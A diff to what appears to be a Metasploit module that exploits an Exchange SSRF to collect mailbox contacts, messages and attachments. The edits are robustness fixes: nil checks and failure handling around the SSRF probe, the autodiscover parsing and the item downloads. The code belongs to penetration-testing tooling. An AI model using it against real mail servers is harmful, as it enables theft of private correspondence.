@@ -88,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Successfuly connected to: #{action['id_attribute']}")
       xml = Nokogiri::XML.parse(response.body)
 
-      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values[0]
+      folder_id = xml.at_xpath('//t:ContactsFolder/t:FolderId', XMLNS)&.values&.at(0)
       print_status("Selected folder: #{action['id_attribute']} (#{folder_id})")
 
       total_count = xml.at_xpath('//t:ContactsFolder/t:TotalCount', XMLNS)&.content
@@ -120,7 +120,7 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Successfuly connected to: #{datastore['FOLDER']}")
       xml = Nokogiri::XML.parse(response.body)
 
-      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values[0]
+      folder_id = xml.at_xpath('//t:Folder/t:FolderId', XMLNS)&.values&.at(0)
       print_status("Selected folder: #{datastore['FOLDER']} (#{folder_id})")
 
       total_count = xml.at_xpath('//t:Folder/t:TotalCount', XMLNS)&.content
@@ -141,7 +141,7 @@ class MetasploitModule < Msf::Auxiliary
     xml = Nokogiri::XML.parse(response.body)
 
     xml.xpath('//t:Message/t:Attachments/t:FileAttachment', XMLNS).each do |item|
-      item_id = item.at_xpath('./t:AttachmentId', XMLNS)&.values[0]
+      item_id = item.at_xpath('./t:AttachmentId', XMLNS)&.values&.at(0)
 
       response = send_xml('POST', ssrf, soap_downattachment(item_id))
       data = Nokogiri::XML.parse(response.body)
@@ -161,6 +161,8 @@ class MetasploitModule < Msf::Auxiliary
 
     xml.xpath('//t:Items/t:Message', XMLNS).each do |item|
       item_info = item.at_xpath('./t:ItemId', XMLNS)&.values
+      next if item_info.nil?
+
       print_status("Download item: #{item_info[1]}")
 
       response = send_xml('POST', ssrf, soap_downitem(item_info[0], item_info[1]))
@@ -207,7 +209,7 @@ class MetasploitModule < Msf::Auxiliary
     server = ''
     owa_urls = []
     xml.xpath('//xmlns:Account/xmlns:Protocol', xmlns).each do |item|
-      type = item.at_xpath('./xmlns:Type', xmlns).content
+      type = item.at_xpath('./xmlns:Type', xmlns)&.content
       if type == 'EXCH'
         server = item.at_xpath('./xmlns:Server', xmlns)&.content
       end
@@ -218,7 +220,7 @@ class MetasploitModule < Msf::Auxiliary
         owa_urls << owa_url.content
       end
     end
-    fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.empty?
+    fail_with(Failure::NotFound, 'No \'Server ID\' was found') if server.nil? || server.empty?
     fail_with(Failure::NotFound, 'No \'OWAUrl\' was found') if owa_urls.empty?
 
     return([server, legacy_dn, owa_urls])
@@ -382,10 +384,8 @@ class MetasploitModule < Msf::Auxiliary
 
     # request for internal server name.
     response = send_http(datastore['METHOD'], "localhost~#{random_ssrf_id}")
-    if response.code != 500 || response.headers['X-FEServer'].empty?
-      print_bad('Could\'t get the \'X-FEServer\' from the headers response.')
-
-      return
+    if response.code != 500 || !response.headers.to_s.include?('X-FEServer')
+      fail_with(Failure::NotFound, 'No \'X-FEServer\' was found')
     end
     server_name = response.headers['X-FEServer']
     print_status("Internal server name (#{server_name})")
